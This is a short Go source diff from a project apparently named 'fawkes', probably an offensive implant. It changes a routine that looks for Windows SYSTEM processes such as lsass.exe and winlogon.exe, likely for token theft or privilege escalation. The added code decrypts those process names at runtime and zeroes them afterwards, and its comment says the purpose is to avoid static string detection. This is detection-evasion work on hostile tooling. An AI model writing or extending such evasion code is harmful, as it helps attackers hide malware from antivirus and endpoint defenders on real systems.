@@ -9,6 +9,7 @@ import (
 	"strings"
 	"unsafe"
 
+	"fawkes/pkg/obfuscate"
 	"fawkes/pkg/structs"
 
 	"golang.org/x/sys/windows"
@@ -164,7 +165,12 @@ func findSystemProcess() (uint32, string, error) {
 	entry.Size = uint32(unsafe.Sizeof(entry))
 
 	// Preferred SYSTEM processes (in order of preference)
-	preferred := []string{"winlogon.exe", "lsass.exe", "services.exe", "svchost.exe"}
+	// Decrypt process names at runtime to avoid static string detection
+	winlogon := obfuscate.Winlogon()
+	defer obfuscate.Zero(winlogon)
+	lsass := obfuscate.Lsass()
+	defer obfuscate.Zero(lsass)
+	preferred := []string{winlogon, lsass, "services.exe", "svchost.exe"}
 	preferredMap := make(map[string]bool)
 	for _, p := range preferred {
 		preferredMap[p] = true
